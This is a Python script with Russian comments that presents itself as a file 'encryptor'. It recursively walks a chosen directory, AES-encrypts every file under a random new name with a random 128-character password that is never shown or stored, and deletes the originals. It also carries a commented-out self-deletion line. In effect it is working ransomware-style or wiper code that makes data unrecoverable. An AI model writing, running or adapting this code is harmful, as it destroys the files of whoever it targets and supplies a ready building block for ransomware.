"""Шифровать и дешифровать мы будем при помощи буфера, таким
образом мы избавимся от ограничения на размер файла (по крайней мере, значительно
уменьшим это ограничение)."""
from pyfiglet import Figlet
import os
import sys
import pyAesCrypt
import secrets
import string
import random

PASS = ''.join(secrets.choice(string.ascii_letters + string.digits) for i in range(128))


def rename(filepath: str):
    filename = ''.join(
        secrets.choice(string.ascii_letters + string.digits) for _ in range(random.randint(4, 16)))
    list = filepath.split('\\')
    list.remove(list[-1])
    list.append(filename)
    filepath = '/'.join(list)
    return filepath


# Функция расшифровки
def encrypt(file: str, password: str):
    print('-' * 80)
    # Задаем размер буфера
    buffer_size = 512 * 1024
    # Вызываем функцию шифрования
    new_file = rename(file)
    pyAesCrypt.encryptFile(file, new_file, password, buffer_size)
    file_encrypt = file.split('\\')[-1]
    print(f"[INFO --- \033[31m\033[1mENCRYPT\033[0m] --- \033[32m\033[1m{file_encrypt}\033[0m")
    # Удаляем исходный файл
    os.remove(file)


def walk(direct: str, PASS):
    # Перебор всех подпапок в указанной папке
    for name in os.listdir(direct):
        try:
            path = os.path.join(direct, name)
            # Если это файл, шифруем его
            if os.path.isfile(path):
                encrypt(path, PASS)
            # Если это папка, рекурсивно повторяем
            else:
                walk(path, PASS)
        except:
            f"[INFO --- \033[31m\033[1mNOT ENCRYPTED\033[0m] --- \033[32m\033[1m{path}\033[0m"


if __name__ == "__main__":
    preview_text = Figlet(font="small", width=300)
    text = preview_text.renderText('E N C R Y P T O R')
    print(f'\033[35m\033[1m{text}\033[0m')

    try:
        DIR = input("НАПИШИ ПУТЬ ДЛЯ ШИФРОВАНИЯ: ")
        # PASS = input("ВВЕДИ ПАРОЛЬ: ")

        # Запуск
        walk(DIR, PASS)
        print('-' * 80)
    except:
        print(
            f"\033[31m\033[1m[ERROR]\033[0m УКАЗАН НЕВЕРНЫЙ ПУТЬ, УКАЖИТЕ ПУТЬ В ФОРМАТЕ \033[31m\033[4mD:\Dir\033[0m")
    # для самоуничтожения программы
    # os.remove(str(sys.argv[0]))
